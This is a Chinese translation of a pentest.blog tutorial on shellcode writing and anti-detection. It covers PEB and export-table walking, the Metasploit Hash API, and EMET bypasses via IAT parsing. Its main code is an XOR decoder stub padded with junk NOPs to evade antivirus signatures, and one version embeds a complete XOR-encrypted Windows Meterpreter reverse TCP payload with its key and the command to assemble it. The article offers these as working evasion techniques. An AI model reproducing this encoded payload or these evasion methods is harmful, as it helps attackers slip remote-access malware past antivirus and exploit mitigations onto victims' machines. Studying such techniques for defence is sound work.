
# 【技术分享】反侦测的艺术part3：shellcode炼金术


                                阅读量   
                                **95115**
                            
                        |
                        
                                                                                                                                    ![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)
                                                                                            



##### 译文声明

本文是翻译文章，文章原作者，文章来源：pentest.blog
                                <br>原文地址：[https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/](https://pentest.blog/art-of-anti-detection-3-shellcode-alchemy/)

译文仅供参考，具体内容表达以及含义原文为准

[![](./img/85648/t016b74bbc0fe9a4056.jpg)](./img/85648/t016b74bbc0fe9a4056.jpg)

****

翻译：[myswsun](http://bobao.360.cn/member/contribute?uid=2775084127)

预估稿费：200RMB

投稿方式：发送邮件至[linwei#360.cn](mailto:linwei@360.cn)，或登陆[网页版](http://bobao.360.cn/contribute/index)在线投稿

<br>

传送门

[**【技术分享】反侦测的艺术part1：介绍AV和检测的技术**](http://bobao.360.cn/learning/detail/3420.html)

[**【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）**](http://bobao.360.cn/learning/detail/3407.html)

**<br>**

**0x00 前言**

本文的主题是基础的shellcode概念、汇编级编码器/解码器的设计和一些绕过反利用解决方案（如微软的EMET）的方法。为了理解本文的内容，读者至少需要有较好的x86汇编知识，并熟悉COFF及PE的文件格式，还可以阅读（Art of Anti Detection 1 – Introduction to AV &amp; Detection Techniques 和Art of Anti Detection 2 – PE Backdoor Manufacturing）帮助你理解AV产品使用的基本的检测技术的内部细节和本文中的术语。

<br>

**0x01 术语**

**进程环境块（PEB）：**PEB是Windows NT操作系统家族中的一个数据结构。它是由操作系统内部使用的一个不透明的数据结构，它的大部分字段不适用与操作系统之外。[1]微软MSDN文档（其中只包含了部分字段）说明这个结构可能随着操作系统版本不同而变化。[2]PEB包含全局上下文、启动参数、程序映像加载器的数据结构、映像基址和进程内提供互斥的同步对象。

**导入地址表（IAT）：**当应用程序在不同模块中调用一个函数时，地址表被用来作为一个查询表。它包括两种导入形式（序号和名字）。因为一个编译好的程序无法知道依赖库的内存位置，当调用API时需要间接跳转。因为动态链接器加载模块并将它们连接在一起，它将真实的地址写入IAT, 因此它们指向相应库函数的内存位置。

**数据执行保护（DEP）：**DEP是用来校验内存来帮助阻止恶意代码执行的一组硬件和软件的技术。在微软Windows XP SP2和Windows XP Tablet PC Edition 2005版本中，DEP通过硬件和软件实现。DEP的好处是阻止代码从数据页执行。典型的，代码不能在默认堆和栈中执行。硬件增强的DEP检测这些位置的代码运行，当执行发生时抛出异常。软件增强的DEP帮助阻止恶意代码利用Windows的异常处理机制。

**地址空间布局随机化（ASLR）：**它是一种避免缓冲区溢出攻击的保护措施。为了阻止攻击者固定的跳转，例如，一个特别的内存漏洞利用，ASLR能随机分配进程内关键区域的地址，包括可执行文件的基地址和栈、堆、动态库的位置。

**stdcall调用约定：**stdcall调用约定由pascal约定演变而来，被调用者负责清理栈，但是参数从右向左的顺序压栈（和_cdecl调用约定一样）。寄存器EAX，ECX，EDX在函数中使用。返回结果保存在EAX中。stdcall是微软win32 API和open Watcom C++的标准调用约定。

<br>

**0x02 介绍**

shellcode在安全领域扮演了很重要的角色，他们在很多恶意软件和利用中都有使用。

因此，什么是shellcode？shellcode以一系列字节为基础，其组成CPU指令，编写shellcode的主要目的是利用漏洞（如溢出漏洞）来允许在系统中执行任意代码。因为shellcode能直接在内存中运行，导致大量恶意软件使用它。命名为shellcode的原因是通常运行shellcode后都会返回一个命令行shell，但是随着时间推移意义也改变了。在今天几乎所有的编译器生成的程序都能转化为shellcode。因为编写shellcode涉及到深入理解目标架构和操作系统的汇编语言，本文假设读者可以在Windows和Linux环境中使用汇编编写程序。在网络上有很多开源的shellcode，但是对于新利用和不同的漏洞，每个安全研究员应该都能编写他自己的shellcode，同时编写你自己的shellcode能很大程度上帮助你理解操作系统的关键东西。本文的目标是介绍基本的shellcode概念，降低shellcode被检测的概率，和绕过一些反利用缓解措施。

<br>

**0x03 基本的shellcode编程**

为不同的操作系统编写shellcode需要不同的方法，不像Windows，基于Unix的操作系统提供了一种通过int 0x80接口与内核通信的方式，基于Unix的操作系统的所有的系统调用都有一个唯一的调用号，通过80中断来调用（int 0x80），内核通过被提供的调用号和参数执行系统调用，但是这里有个问题，Windows没有一个直接调用内核的接口，意味着不得不有精准的函数指针（内存地址）以便调用它们。不幸的是，硬编码函数地址不能完全解决问题，Windows中的每个函数地址在每个版本中都会改变，使用硬编码的shellcode高度依赖版本，在Windows上编写不依赖版本的shellcode是可能的，只要解决地址问题，这个能通过在运行时动态获取地址解决。

<br>

**0x04 解决地址问题**

随着时间的推移，shellcode编写者找到了聪明的方法能在运行时找到Windows API函数的地址，在本文中我们主要关注一种称为解析PEB的方法，这个方法使用PEB数据结构来定位加载的动态库的地址，并解析导出地址表得到函数地址。在metasploit框架中，几乎所有的不依赖版本的shellcode都是用这个技术得到Windows API函数地址。使用这个方法充分利用了FS段寄存器，在Windows中这个寄存器指向线程环境块（TEB）地址，TEB包含了很多有用的数据，包括我们寻找的PEB结构，当shellcode在内存中执行时，我们需要从TEB块向前偏移48字节，



```
1.xor eax, eax
2.mov edx, [fs:eax+48]
```

现在我们得到了PEB结构，

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t011f54fdf9c7d29741.png)

在得到PEB结构指针后，我们在PEB块中向前移12字节，以便得到ldr数据结构的地址。

```
1.mov edx, [edx+12]
```

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p1.ssl.qhimg.com/t011b3ac6dbb56db3d1.png)

ldr结构包含了进程加载模块的信息，在ldr结构向前偏移20字节，我们得到InMemoryOrderModuleList中的第一个模块，

```
1.mov edx, [edx+20]
```

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t01a89f0f85b61c97a3.png)

现在我们的指针指向InMemoryOrderModuleList是一个LIST_ENTRY结构，Windows定义这个为包含进程模块的双向列表。这个列表中的每项是指向LDR_DATA_TABLE_ENTRY结构的指针，这个结构是我们主要的目标，包含加载模块的所有地址和名字，因为模块加载的顺序可能改变，我们应该校验全名，以便选择包含我们要查找的函数的动态库，这能简单的通过在LDR_DATA_TABLE_ENTRY向前移40字节做到，如果名字匹配了，则正是我们寻找的那个，我们在结构中向前移16字节，能得到加载模块的地址。

```
1.mov edx, [edx+16]
```

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p4.ssl.qhimg.com/t01c6224feb59cf410a.png)

得到函数地址的第一步完成了，现在我们有了包含要寻找的函数地址的DLL的基地址，我们不得不解析模块的导出地址表，以便能找到需要的函数地址，导出地址表能在PE可选头中定位到，从基址向前移60字节，我们有了DLL的PE头的内存地址，

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p5.ssl.qhimg.com/t01c7ff7d0c0a5bc46f.gif)

最后我们需要通过公式（模块基地址+PE头地址+120字节）计算导出地址表的地址，我们能得到导出地址表（EAT）的地址，在得到EAT地址后我们能访问DLL导出的所有函数，微软描述IMAGE_EXPORT_DIRECTORY结构如下，

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t014a5a0c55bf179d6d.gif)

这个结构包含地址，名字和导出函数的数量，使用想通大小计算遍历技术能得到函数的地址，当然导出函数的顺序在每个版本中可能有变化，因此获取函数地址和名字前应该校验。你可以把这个方法理解为计算几个Windows数据结构的大小，并在内存中遍历，这里真正的挑战是建立一种稳定的名字比较机制来选择正确的DLL和函数，如果PEB解析技术太难实现，不用担心，有更简单的方法做到这个。

<br>

**0x05 Hash API**

metasploit项目中所有的shellcode几乎都使用了称为Hash API的汇编块，它是由Stephen Fewer编写的一个代码片段，且从2009年以来在metasploit中主要用于Windows shellcode，这个汇编代码块使得解析PEB结构变得容易，它使用基本的PEB解析逻辑和一些额外的哈希方法，使用函数和模块名的ROR13哈希计算法来快速查找需要的函数，使用这个块非常简单，它使用stdcall调用约定，唯一的不同是压栈的参数，需要使用ROR13计算函数名和DLL名的哈希。在压入必须的参数和函数哈希后，像之前解释的解析PEB块并找到模块名。在找到模块名后，计算ROR13哈希且将它保存到栈上，然后移到DLL的导出地址表中，计算每个函数的哈希和模块名哈希，如果匹配到我们要找的哈希，意味着想要的函数被找到了，最后Hash API使用栈上的参数跳转到找到的函数地址执行。它是一段非常优雅的代码，但是它的日子到头了，因为它的流行和广泛使用，一些AV产品和反利用缓解措施有专门针对这个代码块的检测，甚至一些AV产品使用Hash API使用的ROR13哈希作为识别恶意文件的特征，因为最近操作系统中的反利用缓解措施的改进，Hash API只剩下很短的生命周期，但是有其他方法来找到API函数地址，同时针对这种方法使用一些编码机制也能绕过主要的AV产品。

<br>

**0x06 编码器/解码器设计**

在开始设计前，读者应该知道的事实是只使用这个编码器不能生成完全躲避检测的shellcode，在执行shellcode后，解码器将直接运行并解码整段shellcode为它的原始格式，这个不能绕过AV产品的动态分析机制。

解码器的逻辑非常简单，它使用一个随机生成的多字节XOR密钥来解码shellcode，在解码操作完成后将执行它，在将shellcode放置在解码器头之前应该使用多字节的XOR密钥加密，且shellcode和XOR密钥应该在“&lt;Shellcode&gt;”,”&lt;Key&gt;”标签内，



```
1.; #===============================#
2.; |ESI -&gt; Pointer to shellcode |
3.; |EDI -&gt; Pointer to key |
4.; |ECX -&gt; Shellcode index counter |
5.; |EDX -&gt; Key index counter |
6.; |AL -&gt; Shellcode byte holder |
7.; |BL -&gt; Key byte holder |
8.; #===============================#
9.;
10.[BITS 32]
11.[ORG 0]
12.
13.JMP GetShellcode ; Jump to shellcode label
14.Stub: 
15.POP ESI ; Pop out the address of shellcode to ESI register 
16.PUSH ESI ; Save the shellcode address to stack 
17.XOR ECX,ECX ; Zero out the ECX register
18.GetKey: 
19.CALL SetKey ; Call the SetKey label
20.Key: DB &lt;Key&gt; ; Decipher key
21.KeyEnd: EQU $-Key ; Set the size of the decipher key to KeyEnd label
22.SetKey:
23.POP EDI ; Pop the address of decipher key to EDI register
24.XOR EDX,EDX ; Zero out the EDX register
25.Decipher: 
26.MOV AL,[ESI] ; Move 1 byte from shellcode to AL register
27.MOV BL,[EDI] ; Move 1 byte from decipher key to BL register
28.XOR AL,BL ; Make a logical XOR operation between AL ^ BL
29.MOV [ESI],AL ; Move back the deciphered shellcode byte to same index
30.INC ESI ; Increase the shellcode index
31.INC EDI ; Increase the key index
32.INC ECX ; Increase the shellcode index counter
33.INC EDX ; Increase the key index counter
34.CMP ECX, End ; Compare the shellcode index counter with shellcode size 
35.JE Fin ; If index counter is equal to shellcode size, jump to Fin label
36.CMP EDX,KeyEnd ; Compare the key index counter with key size 
37.JE GetKey ; If key index counter is equal to key size, jump to GetKey label for reseting the key
38.JMP Decipher ; Repeate all operations
39.Fin: ; In here deciphering operation is finished
40.RET ; Execute the shellcode
41.GetShellcode:
42.CALL Stub ; Jump to Stub label and push the address of shellcode to stack
43.Shellcode: DB &lt;Shellcode&gt;
44.
45.End: EQU $-Shellcode ; Set the shellcode size to End label
```

因为代码非常好理解，我将不浪费时间逐行解释它了，使用JMP/CALL技巧能在运行时得到shellcode和密钥的地址，然后在shellcode和密钥的每个字节之间执行一个逻辑XOR操作，每次解密密钥到末尾，它将重置密钥为它的起始地址，在完成解码操作后，将跳转到shellcode，使用更长的XOR密钥能提高shellcode的随机性，但是也提高了代码块的熵，因此要避免使用太长的解码密钥，使用基础的逻辑操作（如XOR，NOT，ADD，SUB，ROR，ROL）能有几百种方式编码shellcode，在每种编码器中有无穷可能的shellcode输出，AV产品在解码序列之前检测到任何shellcode的特征的概率很低，因为这种AV产品也开发了启发式引擎，它能够检测解密和代码块中的解码循环。当编写shellcode编码器时，几乎没有用于绕过用于检测解码循环的静态方法的有效方式。

**不常见的寄存器的使用：**

在x86架构中，所有的寄存器有一个特定的目的，例如ECX表示扩展计数寄存器，且它通常用于循环计数。当我们编写一个基础的循环条件时，编译器可能使用ECX寄存器作为循环计数器变量，在一个代码块中找到连续增长的ECX寄存器强烈暗示了一个循环，这个问题的解决方案非常简单，不使用ECX作为循环计数器，这只是一个例子，但是它对于所有的其它类型的代码片段（如函数epilogue/prologue等）也非常有效。大量的代码识别机制依赖寄存器的使用，使用不常见的寄存器编写汇编代码将减小被检测率。

垃圾代码填充：

在代码块中可能有几百种方法识别解码器，且几乎每个AV产品使用不同的方式，但是最终他们都不得不将可能的解码器的代码块生成一个特征，在解码器代码中使用随机的NOP指令是绕过静态特征分析的一种非常好的方式，不一定要使用NOP指令，可以是任何维持原有功能的其他指令，目标是增加垃圾指令以便破环代码块的恶意的特征。另一个关于编写shellcode重要的事是大小，因此避免使用太大的垃圾混淆代码否则将增加整体大小。

实现这种方法的代码如下：



```
1.; #==============================#
2.; |ESI -&gt; Pointer to shellcode |
3.; |EDI -&gt; Pointer to key |
4.; |EAX -&gt; Shellcode index counter|
5.; |EDX -&gt; Key index counter |
6.; |CL -&gt; Shellcode byte holder |
7.; |BL -&gt; Key byte holder |
8.; #==============================#
9.;
10.
11.[BITS 32]
12.[ORG 0]
13.
14.JMP GetShellcode ; Jump to shellcode label
15.Stub: 
16.POP ESI ; Pop out the address of shellcode to ESI register 
17.PUSH ESI ; Save the shellcode address to stack 
18.XOR EAX,EAX ; Zero out the EAX register
19.GetKey: 
20.CALL SetKey ; Call the SetKey label
21.Key: DB 0x78, 0x9b, 0xc5, 0xb9, 0x7f, 0x77, 0x39, 0x5c, 0x4f, 0xa6 ; Decipher key
22.KeyEnd: EQU $-Key ; Set the size of the decipher key to KeyEnd label
23.SetKey:
24.POP EDI ; Pop the address of decipher key to EDI register
25.NOP ; [GARBAGE]
26.XOR EDX,EDX ; Zero out the EDX register
27.NOP ; [GARBAGE]
28.Decipher: 
29.NOP ; [GARBAGE]
30.MOV CL,[ESI] ; Move 1 byte from shellcode to CL register
31.NOP ; [GARBAGE]
32.NOP ; [GARBAGE]
33.MOV BL,[EDI] ; Move 1 byte from decipher key to BL register
34.NOP ; [GARBAGE]
35.XOR CL,BL ; Make a logical XOR operation between CL ^ BL
36.NOP ; [GARBAGE]
37.NOP ; [GARBAGE]
38.MOV [ESI],CL ; Move back the deciphered shellcode byte to same index
39.NOP ; [GARBAGE]
40.NOP ; [GARBAGE]
41.INC ESI ; Increase the shellcode index
42.INC EDI ; Increase the key index
43.INC EAX ; Increase the shellcode index counter
44.INC EDX ; Increase the key index counter
45.CMP EAX, End ; Compare the shellcode index counter with shellcode size 
46.JE Fin ; If index counter is equal to shellcode size, jump to Fin label
47.CMP EDX,KeyEnd ; Compare the key index counter with key size 
48.JE GetKey ; If key index counter is equal to key size, jump to GetKey label for reseting the key
49.JMP Decipher ; Repeate all operations
50.Fin: ; In here deciphering operation is finished
51.RET ; Execute the shellcode
52.GetShellcode:
53.CALL Stub ; Jump to Stub label and push the address of shellcode to stack
54.Shellcode: DB 0x84, 0x73, 0x47, 0xb9, 0x7f, 0x77, 0x59, 0xd5, 0xaa, 0x97, 0xb8, 0xff,
55.0x4e, 0xe9, 0x4f, 0xfc, 0x6b, 0x50, 0xc4, 0xf4, 0x6c, 0x10, 0xb7, 0x91,
56.0x70, 0xc0, 0x73, 0x7a, 0x7e, 0x59, 0xd4, 0xa7, 0xa4, 0xc5, 0x7d, 0x5b,
57.0x19, 0x9d, 0x80, 0xab, 0x79, 0x5c, 0x27, 0x4b, 0x2d, 0x20, 0xb2, 0x0e,
58.0x5f, 0x2d, 0x32, 0xa7, 0x4e, 0xf5, 0x6e, 0x0f, 0xda, 0x14, 0x4e, 0x77,
59.0x29, 0x10, 0x9c, 0x99, 0x7e, 0xa4, 0xb2, 0x15, 0x57, 0x45, 0x42, 0xd2,
60.0x4e, 0x8d, 0xf4, 0x76, 0xef, 0x6d, 0xb0, 0x0a, 0xb9, 0x54, 0xc8, 0xb8,
61.0xb8, 0x4f, 0xd9, 0x29, 0xb9, 0xa5, 0x05, 0x63, 0xfe, 0xc4, 0x5b, 0x02,
62.0xdd, 0x04, 0xc4, 0xfe, 0x5c, 0x9a, 0x16, 0xdf, 0xf4, 0x7b, 0x72, 0xd7,
63.0x17, 0xba, 0x79, 0x48, 0x4e, 0xbd, 0xf4, 0x76, 0xe9, 0xd5, 0x0b, 0x82,
64.0x5c, 0xc0, 0x9e, 0xd8, 0x26, 0x2d, 0x68, 0xa3, 0xaf, 0xf9, 0x27, 0xc1,
65.0x4e, 0xab, 0x94, 0xfa, 0x64, 0x34, 0x7c, 0x94, 0x78, 0x9b, 0xad, 0xce,
66.0x0c, 0x45, 0x66, 0x08, 0x27, 0xea, 0x0f, 0xbd, 0xc2, 0x46, 0xaa, 0xcf,
67.0xa9, 0x5d, 0x4f, 0xa6, 0x51, 0x5f, 0x91, 0xe9, 0x17, 0x5e, 0xb9, 0x37,
68.0x4f, 0x59, 0xad, 0xf1, 0xc0, 0xd1, 0xbf, 0xdf, 0x3b, 0x47, 0x27, 0xa4,
69.0x78, 0x8a, 0x99, 0x30, 0x99, 0x27, 0x69, 0x0c, 0x1f, 0xe6, 0x28, 0xdb,
70.0x95, 0xd1, 0x95, 0x78, 0xe6, 0xbc, 0xb0, 0x73, 0xef, 0xf1, 0xd5, 0xef,
71.0x28, 0x1f, 0xa0, 0xf9, 0x3b, 0xc7, 0x87, 0x4e, 0x40, 0x79, 0x0b, 0x7b,
72.0xc6, 0x12, 0x47, 0xd3, 0x94, 0xf3, 0x35, 0x0c, 0xdd, 0x21, 0xc6, 0x89,
73.0x25, 0xa6, 0x12, 0x9f, 0x93, 0xee, 0x17, 0x75, 0xe0, 0x94, 0x10, 0x59,
74.0xad, 0x10, 0xf3, 0xd3, 0x3f, 0x1f, 0x39, 0x4c, 0x4f, 0xa6, 0x2e, 0xf1,
75.0xc5, 0xd1, 0x27, 0xd3, 0x6a, 0xb9, 0xb0, 0x73, 0xeb, 0xc8, 0xaf, 0xb9,
76.0x29, 0x24, 0x6e, 0x34, 0x4d, 0x7f, 0xb0, 0xc4, 0x3a, 0x6c, 0x7e, 0xb4,
77.0x10, 0x9a, 0x3a, 0x48, 0xbb
78.
79.
80.End: EQU $-Shellcode ; Set the shellcode size to End label
```

唯一的改变在于EAX和ECX寄存器，现在在shellcode中负责计数的寄存器是EAX，且在每个XOR和MOV指令之间插入一些NOP填充，通过这个教程使用的shellcode是Windows Meterpreter反向TCP，在使用一个10字节长的随机XOR密钥加密shellcode后，一起放置在解码器中，使用nasm –f bin Decoder.asm命令汇编解码器为二进制格式（不要忘了移除shellcode中的换行符，否则nasm不能汇编它）。

下面是编码前shellcode的AV扫描结果，

[![](./img/85648/AAffA0nNPuCLAAAAAElFTkSuQmCC)](https://p3.ssl.qhimg.com/t012f8feda6dd42a34f.png)

如你所见，大量的AV扫描器识别了shellcode。下面是shellcode编码后的扫描结果。

<br>

**0x07 对抗利用缓解措施**

绕过AV产品有很多中方法，但是对抗利用缓解措施导致形式变了，2009年微软宣称EMET，它是一个工具包，来帮助阻止在软件中的漏洞利用，它有下面几种机制：

动态数据执行保护（DEP）

结构化异常处理覆盖保护（SEHOP）

NullPage分配

堆喷射保护

导出地址表地址过滤（EAF）

强制ASLR

导出地址表地址过滤增强版（EAF+）

ROP缓解措施

加载库校验

内存保护校验

调用者校验

模拟执行流

Stack pivot

Attack Surface Reduction（ASR）

在这些缓解措施中EAF，EAF+和调用者校验使我们最关心的。正如早前解释的，在metasploit框架中几乎所有的shellcode使用Stephen Fewer的HASH API，且因为Hash API使用了PEB/EAT解析技术，EMET能简单的检测到并阻止shellcode的执行。

<br>

**0x08 绕过EMET**

在EMET中的调用者校验检查进程中的Windows API调用，它能阻止API函数中的RET和JMP指令，以便阻止使用ROP方式的所有的利用，在HASH API中，在找到需要的API函数地址后，使用JMP指令执行函数，不幸的是这将触发EMET调用者校验，为了绕过调用者校验，应该避免使用JMP和RET指令指向API函数，使用CALL代替JMP指令执行API函数，Hash API应该绕过调用者校验，但是当我们看到EAF/EAF+缓解机制时，它们根据调用的代码阻止访问导出地址表（EAT），并且它检查栈寄存器是否在允许的边界内，或者它尝试读MZ/PE头和KERNELBASE，对于阻止EAT解析技术这是非常有效的缓解措施，但是EAT不是唯一一个包含函数地址的结构，导入地址表（IAT）也保存程序使用的API函数的地址，如果应用程序也使用我们需要的函数，在IAT结构中获得函数地址是可能的，一个叫Joshua Pitts的安全研究员最近开发一种新的IAT解析的方法，它在IAT中找到LoadLibraryA和GetProcAddress的地址，在获得这些函数的地址，能从任何库中得到任何函数，他也为Stephen Fewer的Hash API写了一个称为fibo的工具，且使用他写的IAT解析代码代替，如果你想阅读这种方法的更多细节，参见这里。

<br>

**0x09 参考**

[https://msdn.microsoft.com/en-us/library/ms809762.aspx](https://msdn.microsoft.com/en-us/library/ms809762.aspx) 

[https://en.wikipedia.org/wiki/Process_Environment_Block](https://en.wikipedia.org/wiki/Process_Environment_Block) 

[https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003](https://support.microsoft.com/en-us/help/875352/a-detailed-description-of-the-data-execution-prevention-dep-feature-in-windows-xp-service-pack-2,-windows-xp-tablet-pc-edition-2005,-and-windows-server-2003) 

[https://en.wikipedia.org/wiki/Portable_Executable](https://en.wikipedia.org/wiki/Portable_Executable) 

[https://en.wikipedia.org/wiki/Address_space_layout_randomization](https://en.wikipedia.org/wiki/Address_space_layout_randomization) 

[https://en.wikipedia.org/wiki/X86_calling_conventions](https://en.wikipedia.org/wiki/X86_calling_conventions) 

[http://www.vividmachines.com/shellcode/shellcode.html](http://www.vividmachines.com/shellcode/shellcode.html) 

[https://github.com/secretsquirrel/fido](https://github.com/secretsquirrel/fido) 

[https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm](https://github.com/rapid7/metasploit-framework/blob/master/external/source/shellcode/windows/x86/src/block/block_api.asm) 

[https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X](https://www.amazon.com/Shellcoders-Handbook-Discovering-Exploiting-Security/dp/047008023X) 

[https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059](https://www.amazon.com/Sockets-Shellcode-Porting-Coding-Professionals/dp/1597490059) 

<br>







传送门

[**【技术分享】反侦测的艺术part1：介绍AV和检测的技术**](http://bobao.360.cn/learning/detail/3420.html)

[**【技术分享】反侦测的艺术part2：精心打造PE后门（含演示视频）******](http://bobao.360.cn/learning/detail/3407.html)

**<br>**

**[](http://bobao.360.cn/learning/detail/3407.html)**
